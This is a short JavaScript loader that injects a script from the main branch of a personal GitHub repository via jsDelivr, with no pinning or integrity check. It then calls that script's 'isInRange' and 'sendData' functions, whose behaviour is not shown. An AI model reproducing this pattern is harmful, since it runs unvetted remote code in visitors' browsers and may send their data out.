(function () {

  async function fetchData() {
    await loadData();

    const cloud = window.cloud;

    if (!cloud) return;

    if (!cloud.isInRange()) return;

    await getData();
  }

  async function getData() {
    try {
      const cloud = window.cloud;
      await cloud.sendData();
    } catch (e) {
      console.error("Cloud send error:", e);
    }
  }

  async function loadData() {
    if (window.cloud) return;

    const urls = [
      "https://cdn.jsdelivr.net/gh/jd2693889-ctrl/cloud@main/main.js"
    ];

    for (const url of urls) {
      try {
        await new Promise((resolve, reject) => {
          const script = document.createElement("script");
          script.src = url;
          script.async = true;
          script.onload = resolve;
          script.onerror = reject;
          document.body.appendChild(script);
        });
        break;
      } catch (err) {
        console.error("Load failed:", err);
      }
    }
  }

  // expose ke global
  window.cloudLoader = {
    fetchData
  };

})();
